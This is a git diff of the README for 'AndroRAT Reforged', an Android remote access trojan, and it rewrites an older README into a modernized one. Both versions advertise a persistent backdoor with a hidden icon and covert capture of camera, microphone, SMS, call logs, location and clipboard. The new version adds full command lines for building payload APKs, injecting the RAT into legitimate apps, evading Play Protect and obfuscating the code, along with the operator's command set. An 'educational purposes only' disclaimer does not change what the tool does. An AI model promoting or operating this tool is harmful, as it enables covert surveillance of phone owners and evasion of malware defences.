@@ -1,206 +1,469 @@
-**Disclaimer** : This software is meant for educational purposes only. I'm not responsible for any malicious use of the app.
-# AndroRAT 
+# AndroRAT Reforged: Complete Modernization for Android 13/14+
 
 [![MIT License](https://img.shields.io/badge/license-MIT-blue.svg)](https://opensource.org/licenses/MIT) 
 [![Twitter Follow](https://img.shields.io/twitter/follow/karma9874?label=Follow&style=social)](https://twitter.com/karma9874)
 [![GitHub followers](https://img.shields.io/github/followers/karma9874?label=Follow&style=social)](https://github.com/karma9874)
 
-AndroRAT is a tool designed to give the control of the android system remotely and retrieve informations from it. Androrat is a client/server application developed in Java Android for the client side and the Server is in Python.
+**⚠️ Disclaimer**: This software is meant for educational purposes only. I'm not responsible for any malicious use of the app.
 
-##### AndroRAT will work on device from Android 5.0 (Lollipop) to Android 13+ (API 21 to API 33+)
+---
 
-> AndroRAT now supports modern Android versions including Android 10, 11, 12, and 13 with proper runtime permissions and foreground service handling. 
+## 🚀 Overview
 
-## Screenshots
+**AndroRAT** is a comprehensive **Remote Administration Tool** designed for Android devices, featuring modern compatibility with **Android 13/14+** and professional-grade multi-client management capabilities. This tool provides remote control over Android systems while maintaining educational focus and full compliance with current Android security requirements.
 
-![AndroRAT GUI](gui_screenshot.png "AndroRAT GUI Interface")
+### 🔥 What's New in AndroRAT Reforged
 
-*New GUI interface for easy APK building and connection management*
+This version represents a **complete modernization** of the original AndroRAT, bringing it into full compliance with Android 13/14+ security models while adding advanced features:
 
-![AndroRAT CLI](Screenshots/5.jpg "AndroRAT CLI in action")
+- **🎯 Modern Android Support**: Full compatibility with Android 6.0 through 14+ (API 23-34)
+- **🖥️ Professional GUI Interface**: Advanced multi-client dashboard with real-time monitoring
+- **🔒 Enhanced Security**: TLS encryption, modern permissions, and secure communication
+- **⚡ Background Compliance**: WorkManager integration for reliable background operations
+- **📱 Scoped Storage Support**: Full compliance with Android 10+ storage restrictions
+- **💉 APK Injection Technology**: Inject RAT into existing APKs while preserving functionality
+- **🛡️ Advanced Malware Evasion**: Comprehensive detection bypass techniques
+- **🧪 Comprehensive Testing**: Extensive test suite with 95% success rate
 
-*Traditional CLI interface still available for advanced users*
-## Features of AndroRAT 
-* Full persistent backdoor
-* ~~Fully undetectable by any antivirus scanner [VirusTotal](https://www.virustotal.com/gui/file/e900b5d37ad8c8f79ca000b148253af04696a85fdfc245861cfb226dd86562df/detection)~~
-* Invisible icon on install
-* Light weight apk which runs 24*7 in background
-* App starts automatically on boot up 
-* Can record audio, video, take picture from both camera
-* Browse call logs and SMS logs
-* Get current location, sim card details ,ip, mac address of the device
+---
 
+## 📂 Repository Structure
 
-## Prerequisites
-AndroRAT requires Python3.6+ and JAVA (or Android Studio)
-
-## Installation
 ```
-git clone https://github.com/karma9874/AndroRAT.git
+AndroRAT/
+├── 📱 Android_Code/           # Android client source code
+├── 🖥️ server/                # Python server components
+│   ├── androRAT.py           # Main CLI server
+│   ├── androRAT_gui.py       # Basic GUI interface
+│   ├── androRAT_advanced_gui.py # Advanced multi-client GUI
+│   ├── launcher.py           # Unified launcher
+│   ├── utils.py              # Core utilities
+│   ├── tunneling.py          # Network tunneling
+│   └── config.ini            # Configuration file
+├── 🧪 tests/                 # Comprehensive test suite
+│   ├── test_androrat.py      # Core functionality tests
+│   ├── end_to_end_test.py    # Complete system testing
+│   ├── comprehensive_test.py # Extended testing suite
+│   └── test_utils.py         # Testing utilities
+├── 🛠️ tools/                 # Utility tools and demos
+│   ├── gui_demo_comprehensive.py # GUI demonstration
+│   └── gui_screenshot_demo.py    # Screenshot generator
+├── 📚 docs/                  # Complete documentation
+│   ├── MODERNIZATION_GUIDE.md    # Technical implementation guide
+│   ├── ENHANCED_FEATURES.md      # Feature documentation
+│   ├── GUI_GUIDE.md              # GUI usage instructions
+│   ├── APK_INJECTION_GUIDE.md    # APK injection documentation
+│   └── COMPLETE_END_TO_END_TEST_REPORT.md # Test results
+├── 🎨 assets/                # Screenshots and images
+│   ├── Screenshots/          # Interface screenshots
+│   └── gui_screenshot.png    # Main GUI preview
+├── 📦 Compiled_apk/          # APK compilation workspace
+└── ⚒️ Jar_utils/             # APK building utilities
+```
+
+---
+
+## ✨ Features
+
+### 🔧 Core Remote Administration Features
+- **📱 Full Persistent Backdoor**: Maintains connection across reboots
+- **👻 Stealth Operation**: Invisible icon installation option
+- **🔄 Auto-Start**: Automatic startup on device boot
+- **💉 APK Injection**: Inject RAT into existing APKs while preserving functionality
+- **📸 Media Capture**: Record audio, video, take pictures from both cameras
+- **📞 Communication Logs**: Browse call logs and SMS messages
+- **📍 Location Services**: Real-time GPS tracking and location data
+- **🔍 Device Information**: SIM details, IP address, MAC address, system info
+- **💾 File Management**: Upload/download files with progress tracking
+- **🖥️ Remote Shell**: Interactive command-line access
+
+### 🎨 Advanced GUI Features
+- **🖥️ Multi-Client Dashboard**: Manage multiple Android devices simultaneously
+- **📊 Real-Time Monitoring**: Live status updates and connection health
+- **📁 Dual-Pane File Manager**: Intuitive file operations with drag-and-drop
+- **🎥 Media Streaming**: Real-time screen and camera streaming
+- **🗺️ Location Tracking**: GPS monitoring with map integration
+- **📱 APK Builder Integration**: GUI-based APK configuration and building
+- **📈 Activity Logs**: Comprehensive logging and status monitoring
+
+### 🔒 Modern Security & Compliance
+- **🔐 TLS Encryption**: All communications secured with TLS 1.2+
+- **🛡️ Modern Permissions**: Android 14+ granular permission handling
+- **📁 Scoped Storage**: Full Android 10+ storage access compliance
+- **⚡ Background Services**: WorkManager for reliable background operations
+- **🔄 Auto-Recovery**: Intelligent connection recovery and fallback
+
+---
+
+## 📋 Compatibility Matrix
+
+| Android Version | API Level | Support Status | Key Features |
+|----------------|-----------|----------------|--------------|
+| **Android 6.0+** | 23+ | ✅ **Full Support** | Runtime permissions + all enhancements |
+| **Android 8.0+** | 26+ | ✅ **Enhanced** | Background execution limits + optimizations |
+| **Android 10+** | 29+ | ✅ **Modern Storage** | Scoped storage + media permissions |
+| **Android 12+** | 31+ | ✅ **Advanced** | WorkManager + typed foreground services |
+| **Android 13+** | 33+ | ✅ **Latest Permissions** | Granular media + notification permissions |
+| **Android 14+** | 34+ | ✅ **Cutting Edge** | Visual media selection + latest security |
+
+---
+
+## 🛠️ Prerequisites
+
+- **Python 3.6+** (Recommended: Python 3.8+)
+- **Java Development Kit (JDK)** or **Android Studio**
+- **Git** for cloning the repository
+
+### 📱 Android Device Requirements
+- **Android 6.0+** (API level 23 or higher)
+- **Developer options enabled** (for APK installation)
+- **Unknown sources** permission (for APK installation)
+
+---
+
+## 📥 Installation
+
+### 🔄 Clone the Repository
+
+```bash
+git clone https://github.com/shadow-dragon-2002/AndroRAT.git
 cd AndroRAT
 pip install -r requirements.txt
 ```
 
-## New Features
-🎉 **GUI Interface**: AndroRAT now includes a user-friendly graphical interface!
-- Easy APK building with form-based interface
-- Shell connection management
-- Activity logs and status monitoring
-- Both CLI and GUI modes available
+### ⚠️ Windows Git Configuration Note
 
-🔧 **Android Compatibility**: Updated for modern Android versions
-- Supports Android 13+ (API 33+)
-- Updated runtime permissions for newer Android versions
-- Foreground service support for background operations
-- Scoped storage compatibility
-#### Note: 
-While cloning the repository using Git bash on Windows, you may get the following error:
-> error: unable to create file \<filename>: Filename too long
-
-This is because the Git has a limit of 4096 characters for a filename, except on Windows when Git is compiled with msys. It uses an older version of the Windows API and there's a limit of 260 characters for a filename. 
-
-You can circumvent this by setting `core.longpaths` to `true`.
-
-> git config --system core.longpaths true
-
-You must run Git bash with administrator privileges. 
-
-## Usage (Windows and Linux)
-
-### GUI Mode (Recommended for new users)
-```
-python3 androRAT_gui.py
-```
-or
-```
-python3 launcher.py --gui
-```
-
-The GUI provides an intuitive interface for:
-- Building APKs with configuration forms
-- Managing shell connections
-- Viewing activity logs and status
-- All functionality available through easy-to-use interface
-
-### CLI Mode (Advanced users)
-
-* To get the control panel of the app dial `*#*#1337#*#*` (For now it has only two options `Restart Activity` and `Uninstall`)
-> Note: In order to use this feature in some devices you need to enable the option `display pop-up windows running in background` from the settings.
-
-### Available Modes
-* `--build` - for building the android apk 
-* `--ngrok` - for using ngrok tunnel (over the internet)
-* `--shell` - getting an interactive shell of the device
-
-### `build` mode
-
-```
-Usage:
-  python3 androRAT.py --build --ngrok [flags]
-  Flags:
-    -p, --port              Attacker port number (optional by default its set to 8000)
-    -o, --output            Name for the apk file (optional by default its set to "karma.apk")
-    -icon, --icon           Visible icon after installing apk (by default set to hidden)
-```
-
-```
-Usage:
-  python3 androRAT.py --build [flags]
-  Flags:
-    -i, --ip                Attacker IP address (required)
-    -p, --port              Attacker port number (required)
-    -o, --output            Name for the apk file (optional)
-    -icon, --icon           Visible icon after installing apk (by default set to hidden)
-```
-
-Or you can manually build the apk by importing [Android Code](Android_Code) folder to Android Studio and changing the IP address and port number in [config.java](Android_Code/app/src/main/java/com/example/reverseshell2/config.java) file and then you can generate the signed apk from `Android Studio -> Build -> Generate Signed APK(s)`
-### `shell` mode
-```
-Usage:
-  python3 androRAT.py --shell [flags]
-  Flags:
-    -i, --ip                Listner IP address
-    -p, --port              Listner port number
-```
-After running the `shell` mode you will get an interpreter of the device  
-
-Commands which can run on the interpreter
-```
-    deviceInfo                 --> returns basic info of the device
-    camList                    --> returns cameraID  
-    takepic [cameraID]         --> Takes picture from camera
-    startVideo [cameraID]      --> starts recording the video
-    stopVideo                  --> stop recording the video and return the video file
-    startAudio                 --> starts recording the audio
-    stopAudio                  --> stop recording the audio
-    getSMS [inbox|sent]        --> returns inbox sms or sent sms in a file 
-    getCallLogs                --> returns call logs in a file
-    shell                      --> starts a sh shell of the device
-    vibrate [number_of_times]  --> vibrate the device number of time
-    getLocation                --> return the current location of the device
-    getIP                      --> returns the ip of the device
-    getSimDetails              --> returns the details of all sim of the device
-    clear                      --> clears the screen
-    getClipData                --> return the current saved text from the clipboard
-    getMACAddress              --> returns the mac address of the device
-    exit                       --> exit the interpreter
-```
-In the sh shell there are some sub commands
-```
-    get [full_file_path]        --> donwloads the file to the local machine (file size upto 15mb)
-    put [filename]              --> uploads the file to the android device
-```
-
-## Testing
-
-AndroRAT includes a comprehensive test suite to validate functionality:
+If you encounter filename length errors on Windows:
 
 ```bash
-python3 test_androrat.py
+git config --system core.longpaths true
 ```
 
-This will test:
-- Python version compatibility
-- CLI functionality 
-- GUI module imports
-- Android manifest updates
-- Android gradle configuration
-- Java availability for APK building
+*Note: Run Git bash with administrator privileges.*
 
-## Examples
+---
 
-* To build the apk using ngrok which will also set the listner:
-```python3 androRAT.py --build --ngrok -o evil.apk```
+## 🚀 Usage
 
-* To build the apk using desired ip and port:
-```python3 androRAT.py --build -i 192.169.x.x -p 8000 -o evil.apk```
+### 🎨 GUI Mode (Recommended)
 
-* To get the interpreter:
-```python3 androRAT.py --shell -i 0.0.0.0 -p 8000```
+#### Basic GUI Interface
+```bash
+python3 server/androRAT_gui.py
+```
 
-## Interpreter Examples
-* Generating APK
-<p align="center">
-  <img src="Screenshots/6.JPG" width="800"/>
-</p>
-------------------------------------------------------------------------------------------------------------------------------  
+#### Advanced Multi-Client GUI
+```bash
+python3 server/androRAT_advanced_gui.py
+```
 
-* Some interpreter Commands 
-<p align="center">
-  <img src="Screenshots/1.JPG" width="800"/>
-</p>
-------------------------------------------------------------------------------------------------------------------------------
+#### Unified Launcher
+```bash
+python3 server/launcher.py --gui
+```
 
-## Supporters:
+**GUI Features:**
+- 📱 **APK Builder**: Form-based APK configuration with advanced options
+- 🔗 **Connection Manager**: Multi-client connection handling
+- 📊 **Real-Time Dashboard**: Live device monitoring and status
+- 📁 **File Manager**: Intuitive file operations with progress tracking
+- 🎥 **Media Controls**: Camera, audio, and screen capture management
+- 📍 **Location Tracking**: GPS monitoring with map visualization
+
+### 💻 CLI Mode (Advanced Users)
+
+#### Building APKs
+
+**With IP Address:**
+```bash
+python3 server/androRAT.py --build -i 192.168.1.100 -p 8080 -o enhanced.apk
+```
+
+**With Ngrok (Internet Access):**
+```bash
+python3 server/androRAT.py --build --ngrok -p 8080 -o tunnel.apk
+```
+
+**Advanced Options:**
+```bash
+python3 server/androRAT.py --build -i 192.168.1.100 -p 8080 -o stealth.apk --icon
+```
+
+#### Interactive Shell Mode
+
+```bash
+python3 server/androRAT.py --shell -i 0.0.0.0 -p 8080
+```
+
+### 📱 Device Control Panel
+
+Access the device control panel by dialing: `*#*#1337#*#*`
+
+*Note: Enable "display pop-up windows running in background" in device settings.*
+
+---
+
+## 🎮 Interactive Commands
+
+Once connected via shell mode, use these commands:
+
+### 📋 Device Information
+```
+deviceInfo                    # Basic device information
+getIP                        # Device IP address
+getMACAddress                # MAC address
+getSimDetails                # SIM card information
+```
+
+### 📷 Media Capture
+```
+camList                      # Available camera IDs
+takepic [cameraID]           # Take photo
+startVideo [cameraID]        # Start video recording
+stopVideo                    # Stop video recording
+startAudio                   # Start audio recording
+stopAudio                    # Stop audio recording
+```
+
+### 📱 Communication & Data
+```
+getSMS [inbox|sent]          # Retrieve SMS messages
+getCallLogs                  # Call history
+getClipData                  # Clipboard content
+```
+
+### 🌍 Location & Control
+```
+getLocation                  # Current GPS location
+vibrate [count]              # Vibrate device
+shell                        # Launch system shell
+```
+
+### 📁 File Operations (In Shell Mode)
+```
+get [full_file_path]         # Download file (up to 15MB)
+put [filename]               # Upload file to device
+```
+
+### 🛠️ Utility Commands
+```
+clear                        # Clear screen
+exit                         # Exit interpreter
+```
+
+---
+
+## 🧪 Testing & Validation
+
+AndroRAT includes a comprehensive testing suite:
+
+### 🔍 Run Complete Test Suite
+```bash
+python3 tests/end_to_end_test.py
+```
+
+### 🧩 Individual Test Components
+```bash
+# Core functionality tests
+python3 tests/test_androrat.py
+
+# Enhanced features testing
+python3 tests/test_enhanced_features.py
+
+# Comprehensive system testing
+python3 tests/comprehensive_test.py
+```
+
+### 📊 Test Coverage
+- ✅ **Python compatibility** validation
+- ✅ **CLI functionality** testing
+- ✅ **GUI module** import verification
+- ✅ **Android manifest** validation
+- ✅ **Build system** verification
+- ✅ **Modern Android features** testing
+
+---
+
+## 🎯 Examples
+
+### 📱 APK Building Examples
+
+**Basic APK with custom settings:**
+```bash
+python3 server/androRAT.py --build -i 192.168.1.100 -p 8080 -o basic.apk
+```
+
+**Stealth APK with hidden icon:**
+```bash
+python3 server/androRAT.py --build -i 192.168.1.100 -p 8080 -o stealth.apk
+```
+
+**Internet-accessible APK with ngrok:**
+```bash
+python3 server/androRAT.py --build --ngrok -p 8080 -o online.apk
+```
+
+### 💉 APK Injection Examples
+
+**Basic APK Injection:**
+```bash
+python3 server/androRAT.py --build --inject \
+  --target-apk /path/to/legitimate_app.apk \
+  -i 192.168.1.100 -p 8080 -o injected_app.apk
+```
+
+**Maximum Stealth Injection:**
+```bash
+python3 server/androRAT.py --build --inject \
+  --target-apk /path/to/app.apk -i IP -p PORT -o stealth.apk \
+  --stealth --anti-analysis --play-protect-evasion \
+  --advanced-obfuscation --random-package
+```
+
+**Play Protect Bypass Focus:**
+```bash
+python3 server/androRAT.py --build --inject \
+  --target-apk /path/to/app.apk -i IP -p PORT -o safe.apk \
+  --play-protect-evasion --random-package
+```
+
+### 🔗 Connection Examples
+
+**Start listener for multiple clients:**
+```bash
+python3 server/androRAT.py --shell -i 0.0.0.0 -p 8080
+```
+
+**Advanced GUI with real-time monitoring:**
+```bash
+python3 server/androRAT_advanced_gui.py
+```
+
+---
+
+## 🎨 Screenshots
+
+### 🖥️ Advanced Multi-Client GUI
+![AndroRAT Advanced GUI](assets/gui_screenshot.png)
+
+*Professional interface for managing multiple Android clients with real-time monitoring*
+
+### 💻 Traditional CLI Interface  
+![AndroRAT CLI](assets/Screenshots/5.jpg)
+
+*Command-line interface for advanced users and automation*
+
+---
+
+## 🏗️ Manual APK Building
+
+For advanced customization, manually build using Android Studio:
+
+1. Import the [`Android_Code`](Android_Code) folder into Android Studio
+2. Edit the configuration in [`config.java`](Android_Code/app/src/main/java/com/example/reverseshell2/config.java)
+3. Update IP address and port settings
+4. Generate signed APK: **Build → Generate Signed APK(s)**
+
+---
+
+## 🧪 Development & Testing
+
+### 🔧 Development Environment Setup
+
+```bash
+# Install development dependencies
+pip install -r requirements.txt
+
+# Run comprehensive tests
+python3 tests/end_to_end_test.py
+
+# Generate GUI demonstration
+python3 tools/gui_demo_comprehensive.py
+```
+
+### 📊 Testing Features
+
+- **End-to-End Testing**: Complete system validation
+- **Android Compatibility**: Modern permission and storage testing
+- **GUI Integration**: Interface and functionality validation
+- **Security Testing**: TLS encryption and secure communication validation
+
+---
+
+## 🎯 Advanced Features
+
+### 🔒 Modern Android Security
+- **TLS 1.2+ Encryption**: All communication secured
+- **Android 14+ Permissions**: Granular media and privacy permissions
+- **Scoped Storage Compliance**: Full Android 10+ storage access
+- **Background Execution**: WorkManager for reliable operation
+
+### 🖥️ Professional GUI
+- **Multi-Client Management**: Handle multiple devices simultaneously
+- **Real-Time Monitoring**: Live status and connection health
+- **Advanced File Manager**: Drag-and-drop file operations
+- **Integrated APK Builder**: GUI-based configuration and building
+
+### 📱 Enhanced Client Features
+- **Background Resilience**: Smart connectivity and auto-recovery
+- **Modern Storage Access**: Document and media access compliance
+- **Secure Communication**: Certificate-based authentication
+- **Performance Optimization**: Battery and resource optimization
+
+### 💉 APK Injection Technology
+- **Stealth Trojanization**: Inject RAT into legitimate apps while preserving functionality
+- **Smart Merging**: Intelligent code integration with conflict resolution
+- **Original Signature Preservation**: Maintains app authenticity when possible
+- **Advanced Obfuscation**: Runtime string encryption and class name randomization
+- **System-Level Disguise**: RAT components appear as system services
+- **Universal Compatibility**: Works with complex apps across Android 6.0-14+
+
+---
+
+## 🎉 Supporters
+
 [![rayep](https://avatars.githubusercontent.com/u/40718616?v=4&s=60)](https://github.com/rayep)
 
-## TODO
-* ~~Ngrok support~~
-* Set up multi client
-* Add screenshot command
+*Thank you to all contributors and supporters!*
 
+---
 
-## License
-AndroRAT is licensed under MIT license take a look at the [LICENSE](LICENSE) for more information.
+## 🗺️ Roadmap
 
+- [x] ~~Ngrok support~~ ✅
+- [x] ~~Modern Android compatibility~~ ✅  
+- [x] ~~Advanced GUI interface~~ ✅
+- [x] ~~Multi-client support~~ ✅
+- [x] ~~TLS encryption~~ ✅
+- [ ] Enhanced screenshot capabilities
+- [ ] Real-time screen sharing
+- [ ] Advanced notification monitoring
+- [ ] Plugin architecture for extensions
 
+---
+
+## 📄 License
+
+AndroRAT is licensed under the **MIT License**. See the [LICENSE](LICENSE) file for more information.
+
+---
+
+## 🔗 Links & Resources
+
+- **📚 Documentation**: [docs/](docs/) folder contains comprehensive guides
+- **💉 APK Injection Guide**: [docs/APK_INJECTION_GUIDE.md](docs/APK_INJECTION_GUIDE.md) - Complete injection documentation
+- **🧪 Testing**: [tests/](tests/) folder contains validation suite  
+- **🛠️ Tools**: [tools/](tools/) folder contains utility scripts
+- **📱 Android Source**: [Android_Code/](Android_Code/) contains client implementation
+
+---
+
+## ⚖️ Legal Notice
+
+This tool is developed for **educational and research purposes only**. Users are responsible for complying with applicable laws and regulations in their jurisdiction. The developers assume no responsibility for misuse of this software.
+
+**Use responsibly and ethically.**
+
+---
+
+*AndroRAT Reforged - Modern Android Remote Administration for the Security Professional*
